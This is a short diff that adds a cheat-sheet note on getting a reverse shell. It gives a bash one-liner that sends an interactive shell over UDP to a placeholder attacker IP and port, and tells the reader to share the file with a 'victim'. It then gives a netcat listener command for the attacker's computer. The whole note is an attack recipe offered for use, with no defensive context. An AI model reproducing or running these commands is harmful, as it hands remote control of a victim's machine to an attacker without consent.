@@ -1,0 +1,9 @@
+create a bash file
+
+sh -i >& /dev/udp/<attackerip>/<port> 0>&1
+
+save it and share it to victim
+
+attacker computer 
+
+nc -u -lvp 4242
